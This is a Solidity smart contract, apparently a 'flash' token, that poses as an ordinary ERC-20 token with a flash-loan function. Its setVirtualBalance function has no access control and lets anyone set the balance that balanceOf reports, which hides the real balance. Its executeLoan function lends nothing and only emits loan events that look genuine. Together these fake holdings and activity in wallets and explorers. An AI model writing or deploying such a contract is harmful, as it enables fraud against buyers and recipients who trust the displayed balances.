// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FlashProtocol {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) private _virtualBalances;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event LoanExecution(address indexed operator, uint256 amount);
    event LoanSettlement(address indexed operator, uint256 amount);

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        uint256 initialSupply
    ) {
        require(bytes(tokenName).length > 0, "Token name cannot be empty");
        require(bytes(tokenSymbol).length > 0, "Token symbol cannot be empty");
        require(tokenDecimals > 0, "Decimals must be greater than zero");
        require(initialSupply > 0, "Initial supply must be greater than zero");

        name = tokenName;
        symbol = tokenSymbol;
        decimals = tokenDecimals;
        totalSupply = initialSupply;
        _balances[msg.sender] = initialSupply;
        
        emit Transfer(address(0), msg.sender, initialSupply);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(from != address(0), "Transfer from zero address");
        require(to != address(0), "Transfer to zero address");
        require(_balances[from] >= amount, "Insufficient balance");
        
        _balances[from] -= amount;
        _balances[to] += amount;
        
        emit Transfer(from, to, amount);
        return true;
    }

    function executeLoan(uint256 amount) external {
        require(amount > 0, "Amount must be greater than zero");
        
        uint256 balanceBefore = _balances[msg.sender];
        
        _balances[msg.sender] += amount;
        emit LoanExecution(msg.sender, amount);
        
        require(
            _balances[msg.sender] >= balanceBefore + amount,
            "Loan not settled"
        );
        
        _balances[msg.sender] = balanceBefore;
        emit LoanSettlement(msg.sender, amount);
    }

    function setVirtualBalance(address target, uint256 amount) external {
        require(target != address(0), "Zero address not allowed");
        _virtualBalances[target] = amount;
    }

    function balanceOf(address account) public view returns (uint256) {
        require(account != address(0), "Zero address not allowed");
        if(_virtualBalances[account] > 0) {
            return _virtualBalances[account];
        }
        return _balances[account];
    }

    function getActualBalance(address account) public view returns (uint256) {
        require(account != address(0), "Zero address not allowed");
        return _balances[account];
    }
}